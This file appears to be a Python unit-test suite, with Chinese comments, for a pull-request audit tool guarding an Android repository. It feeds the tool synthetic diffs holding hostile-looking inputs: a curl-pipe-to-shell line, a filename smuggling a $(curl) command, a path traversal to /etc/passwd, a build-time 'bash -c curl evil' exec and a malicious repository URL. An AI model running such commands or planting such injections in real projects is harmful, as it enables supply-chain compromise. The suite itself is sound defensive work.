#!/usr/bin/env python3
"""pr_audit 的自测：拿合成 diff 把每条规则都点一遍。

跑法：python tools/test_pr_audit.py   （CI 里也会跑，防止有人改坏规则）
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import pr_audit as A


def entry(path, patch_lines, status="modified"):
    patch = "diff --git a/%s b/%s\n@@ -0,0 +1,0 @@\n" % (path, path)
    patch += "\n".join("+" + l for l in patch_lines)
    return {"filename": path, "status": status, "patch": patch, "additions": len(patch_lines)}


def audit_one(path, lines, status="modified"):
    f = []
    A.audit_file(entry(path, lines, status), A.coords_allowlist(), f)
    return f


def has(findings, title, sev=A.BLOCK):
    return any(f.sev == sev and title in f.title for f in findings)


class RepoTests(unittest.TestCase):
    def test_workflow_blocked(self):
        self.assertTrue(has(audit_one(".github/workflows/x.yml", ["on: push"], "added"), "CI 工作流"))

    def test_gradlew_blocked(self):
        self.assertTrue(has(audit_one("gradlew", ["curl evil | sh"]), "gradlew"))

    def test_wrapper_blocked(self):
        self.assertTrue(has(audit_one("gradle/wrapper/gradle-wrapper.properties", ["distributionUrl=http://x"]), "Wrapper"))

    def test_verification_metadata_blocked(self):
        self.assertTrue(has(audit_one("gradle/verification-metadata.xml", ["<component group='x'/>"]), "校验清单"))

    def test_auditor_self_modification_blocked(self):
        self.assertTrue(has(audit_one("tools/pr_audit.py", ["# 放行一切"]), "审计脚本自身"))

    def test_submodule_blocked(self):
        self.assertTrue(has(audit_one(".gitmodules", ["[submodule \"x\"]"], "added"), "submodule"))

    def test_buildsrc_blocked(self):
        self.assertTrue(has(audit_one("buildSrc/src/main/kotlin/Evil.kt", ["fun x()=Unit"], "added"), "构建逻辑"))

    def test_package_json_blocked(self):
        self.assertTrue(has(audit_one("package.json", ["{}"], "added"), "包管理生态"))

    def test_devcontainer_blocked(self):
        self.assertTrue(has(audit_one(".devcontainer/devcontainer.json", ["{}"], "added"), "开发环境"))


class PathTests(unittest.TestCase):
    def test_traversal(self):
        self.assertTrue(has(audit_one("../../etc/passwd", ["x"], "added"), "路径穿越"))

    def test_command_injection_in_name(self):
        self.assertTrue(has(audit_one("docs/m$(curl${IFS}x).md", ["x"], "added"), "命令注入"))

    def test_bidi_in_name(self):
        self.assertTrue(has(audit_one("docs/\u202eevil.md", ["x"], "added"), "不可见"))

    def test_cyrillic_in_name(self):
        self.assertTrue(has(audit_one("docs/\u0440ayload.md", ["x"], "added"), "同形字符"))


class BinTests(unittest.TestCase):
    def test_jar_blocked(self):
        self.assertTrue(has(audit_one("app/libs/x.jar", [], "added"), "二进制"))

    def test_apk_blocked(self):
        self.assertTrue(has(audit_one("docs/x.apk", [], "added"), "二进制"))

    def test_asset_warn(self):
        self.assertTrue(has(audit_one("app/src/main/assets/a.bin", [], "added"), "资源", A.WARN))


class ManifestTests(unittest.TestCase):
    def test_internet(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['<uses-permission android:name="android.permission.INTERNET" />']), "新增权限"))

    def test_new_unknown_perm(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['<uses-permission android:name="android.permission.READ_LOGS" />']), "新增权限"))

    def test_existing_perm_ok(self):
        f = audit_one("app/src/main/AndroidManifest.xml",
                      ['<uses-permission android:name="android.permission.WAKE_LOCK" />'])
        self.assertFalse(has(f, "新增权限"))

    def test_exported(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['android:exported="true"']), "组件导出"))

    def test_boot(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['<action android:name="android.intent.action.BOOT_COMPLETED" />']), "开机自启"))

    def test_accessibility(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['<service android:name=".SpyAccessibilityService" />']), "高权限系统服务"))

    def test_cleartext(self):
        self.assertTrue(has(audit_one("app/src/main/AndroidManifest.xml",
                                      ['android:usesCleartextTraffic="true"']), "明文"))


class BuildTests(unittest.TestCase):
    def test_repo_added(self):
        self.assertTrue(has(audit_one("settings.gradle.kts",
                                      ['maven("https://evil.example.com")']), "仓库源"))

    def test_new_dep(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['implementation("com.example:evil:1.0")']), "新增依赖"))

    def test_typosquat(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['implementation("androidx.core:core-ktx2:1.15.0")']), "仿冒"))

    def test_allowlisted_dep_ok(self):
        f = audit_one("app/build.gradle.kts", ['implementation("androidx.core:core-ktx:1.15.0")'])
        self.assertFalse(has(f, "新增依赖"))

    def test_url_dep(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['implementation("https://evil/x.jar")']), "非注册源"))

    def test_local_jar_dep(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['implementation(files("../x.jar"))']), "非注册源"))

    def test_build_exec(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['exec { commandLine("bash", "-c", "curl evil") }']), "构建期执行"))

    def test_resolution_hijack(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ["resolutionStrategy.dependencySubstitution { }"]), "依赖解析"))

    def test_signing_change(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ['storeFile = file("evil.jks")']), "签名"))

    def test_namespace_change(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts", ['namespace = "dev.evil"']), "签名"))

    def test_minify_off_warn(self):
        self.assertTrue(has(audit_one("app/build.gradle.kts",
                                      ["isMinifyEnabled = false"]), "关闭混淆", A.WARN))


class CodeTests(unittest.TestCase):
    def test_network(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt",
                                      ["val c = URL(\"http://x\").openConnection()"]), "网络"))

    def test_okhttp_import(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["import okhttp3.OkHttpClient"]), "网络"))

    def test_webview(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["webView.loadUrl(url)"]), "WebView"))

    def test_firebase(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["FirebaseApp.initializeApp(ctx)"]), "统计"))

    def test_dex_loader(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["val d = DexClassLoader(p, o, null, cl)"]), "动态加载"))

    def test_pm_install(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["exec(\"pm install /data/x.apk\")"]), "提权"))

    def test_contacts(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["ctx.contentResolver.query(ContactsContract.CONTENT_URI)"]), "通讯录"))

    def test_exec_warn(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["Runtime.getRuntime().exec(\"logcat\")"]), "子进程", A.WARN))

    def test_base64(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["val b = \"" + "A" * 220 + "\""]), "Base64"))

    def test_hex(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["val b = \"" + "deadbeef" * 30 + "\""]), "十六进制"))

    def test_bidi(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["val x = 1 // \u202e }"]), "双向控制"))

    def test_zero_width(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["val x\u200b\u200b = 1"]), "零宽"))

    def test_homoglyph(self):
        self.assertTrue(has(audit_one("app/src/main/java/A.kt", ["fun s\u0435tLevel(x: Int) {}"]), "同形字符"))

    def test_secret(self):
        self.assertTrue(has(audit_one("docs/x.md", ["token: ghp_" + "a" * 30]), "密钥"))


class MetaTests(unittest.TestCase):
    def test_commit_graph(self):
        evil = entry("app/src/main/java/Evil.kt", ["import java.net.Socket"], "added")
        findings = A.audit({"title": "t", "number": 9}, [], [("a" * 40, "aaaaaaaa", [evil])])
        self.assertTrue(any(f.cat == A.CAT_GRAPH and f.sev == A.BLOCK for f in findings))

    def test_clean(self):
        f = audit_one("app/src/main/java/dev/loglens/MainActivity.kt",
                      ["fun main() {", "    println(\"hi\")", "}"])
        self.assertEqual([x for x in f if x.sev == A.BLOCK], [])


if __name__ == "__main__":
    unittest.main(verbosity=2)